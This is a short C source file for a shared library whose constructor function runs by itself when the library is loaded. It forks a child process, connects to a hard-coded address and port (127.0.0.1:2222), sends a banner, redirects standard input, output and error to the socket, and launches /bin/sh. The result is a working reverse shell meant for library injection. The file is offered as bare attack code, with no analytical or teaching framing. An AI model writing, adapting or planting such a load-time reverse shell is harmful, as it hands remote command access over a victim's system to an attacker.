#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

#define REMOTE_ADDR "127.0.0.1"
#define REMOTE_PORT 2222

static int con() __attribute__((constructor));


int  con()
{

	int pid = fork();
    	if(pid == 0)
	{	
		char buffy[] = "connecting people\n\r";
    		struct sockaddr_in sa;
    		int s;

    		sa.sin_family = AF_INET;
    		sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    		sa.sin_port = htons(REMOTE_PORT);

    		s = socket(AF_INET, SOCK_STREAM, 0);
    		connect(s, (struct sockaddr *)&sa, sizeof(sa));
		write(s,buffy,sizeof(buffy));
    		dup2(s, 0);
    		dup2(s, 1);
    		dup2(s, 2);

		execve("/bin/sh", 0, 0);
		return 0;
	}
	else
	{
		return 0;
	}
}
